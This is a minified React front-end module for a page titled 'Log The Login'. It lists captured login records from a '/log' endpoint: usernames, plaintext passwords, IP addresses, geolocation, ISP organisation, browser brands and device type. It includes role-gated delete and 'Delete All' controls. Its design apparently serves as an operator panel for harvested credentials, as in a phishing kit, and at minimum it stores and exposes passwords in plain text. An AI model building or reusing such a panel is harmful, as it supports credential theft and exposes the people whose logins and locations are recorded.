import{u as R,b as k,r as t,j as s,L as A,a as u}from"./index-BmxxCy7I.js";import{u as E,f as T,c as M,g as H,a as I}from"./index-DmNrHZv1.js";import{B as y}from"./button-Bfp6yoaO.js";import{C as B}from"./card-cpS3x2xe.js";import{L as $}from"./Loader-BoZkkqIJ.js";import{T as O,a as Q,b as N,c as _,d as P,e as U}from"./table-B0sQA5PZ.js";import{A as q}from"./AlertDialogDemo-f24LsK89.js";import{I as z}from"./input-C12z15Ho.js";function ee(){const{user:a,setNotification:c}=R(),m=k(),[g,v]=t.useState([]),[V,n]=t.useState(!1),[x,h]=t.useState(null),[L,d]=t.useState(!1),[r,f]=t.useState("");t.useEffect(()=>{["owner","log"].some(e=>a.role.includes(e))||m("/404")},[a,m]);const i=()=>{n(!0),u.get("/log").then(e=>{v(e.data),n(!1)}).catch(e=>{console.error("Error fetching todos",e),n(!1)})};t.useEffect(()=>{i()},[]);const p=(e=!1)=>{h(e),d(!0)},S=()=>{x?u.delete(`/log/${x.id}`).then(()=>{c("Todo was successfully deleted"),i()}).catch(e=>{c("Error deleting todo",e)}):(u.delete("/log").then(()=>{c("Todo was successfully deleted"),i()}).catch(e=>{c("Error deleting todo",e)}),d(!1),h(null))},l=M(),D=t.useMemo(()=>[l.accessor("id",{header:"Id",cell:e=>e.getValue()}),l.accessor("username",{header:"username",cell:e=>e.getValue()?e.getValue().toUpperCase():" "}),l.accessor("password",{header:"password",cell:e=>e.getValue()?e.getValue().length>25?`${e.getValue().substring(0,15)}...`:e.getValue():" "}),l.accessor("loc",{header:"loc",cell:e=>e.getValue()}),l.accessor("ip",{header:"ip",cell:e=>e.getValue()}),l.accessor("city",{header:"city",cell:e=>e.getValue()}),l.accessor("region",{header:"region",cell:e=>e.getValue()}),l.accessor("org",{header:"org",cell:e=>e.getValue()}),l.accessor("login_time",{header:"login_time",cell:e=>e.getValue()}),l.accessor("brands",{header:"brands",cell:e=>e.getValue()}),l.accessor("mobile",{header:"mobile",cell:e=>e.getValue()}),l.display({id:"actions",header:"Actions",cell:({row:e})=>{["owner","log"].some(o=>a.role.includes(o))&&(A,`${e.original.id}`),["owner","log-d"].some(o=>a.role.includes(o))&&y}})],[l,a.role]),w=t.useMemo(()=>g.filter(e=>{var o,b,j;return(((o=e.username)==null?void 0:o.toLowerCase())||"").includes(r.toLowerCase())||(((b=e.topic)==null?void 0:b.toLowerCase())||"").includes(r.toLowerCase())||(((j=e.description)==null?void 0:j.toLowerCase())||"").includes(r.toLowerCase())}),[g,r]),C=E({data:w,columns:D,getCoreRowModel:H(),getSortedRowModel:I()});return s.jsxs("div",{className:"p-4 mx-auto",children:[s.jsxs("div",{className:"flex flex-col sm:flex-row justify-between items-center mb-4",children:[s.jsx("h1",{className:"text-2xl font-semibold cursor-pointer",onClick:()=>f(""),children:"Log The Login"}),s.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center w-full sm:w-auto sm:space-x-4",children:[s.jsx("div",{className:"w-full sm:w-1/2 mb-4 sm:mb-0 sm:order-1 mr-6"}),s.jsx(z,{type:"text",placeholder:"Search",value:r,onChange:e=>f(e.target.value),className:"py-2 px-4 rounded-md focus:outline-none focus:ring-2 sm:order-2 xl:w-[200px]"}),["owner","log-d"].some(e=>{var o;return(o=a==null?void 0:a.role)==null?void 0:o.includes(e)})&&s.jsx(y,{className:"bg-red-500 text-white py-2 px-4 rounded-md hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-500 sm:order-2 xl:w-[100px]",onClick:()=>p(),children:"Delete All"})]})]}),s.jsxs("div",{className:"mt-8",children:[s.jsx(B,{className:"overflow-x-auto",children:V?s.jsx("div",{className:"flex items-center justify-center p-4",children:s.jsx($,{})}):w.length>0?s.jsxs(O,{children:[s.jsx(Q,{children:C.getHeaderGroups().map(e=>s.jsx(N,{children:e.headers.map(o=>s.jsx(_,{className:"cursor-pointer",children:o.isPlaceholder?null:s.jsxs("div",{onClick:o.column.getToggleSortingHandler(),children:[T(o.column.columnDef.header,o.getContext()),{asc:" ðŸ”¼ ",desc:" ðŸ”½ "}[o.column.getIsSorted()]??null]})},o.id))},e.id))}),s.jsx(P,{children:C.getRowModel().rows.map(e=>s.jsx(N,{children:e.getVisibleCells().map(o=>s.jsx(U,{children:T(o.column.columnDef.cell,o.getContext())},o.id))},e.id))})]}):s.jsx("div",{className:"p-4 text-center text-gray-500 dark:text-gray-400",children:"No found."})}),s.jsx(q,{open:L,onClose:()=>d(!1),onConfirm:S,title:"Confirm Deletion",description:"Are you sure you want to delete this Log? This action cannot be undone."})]})]})}export{ee as default};
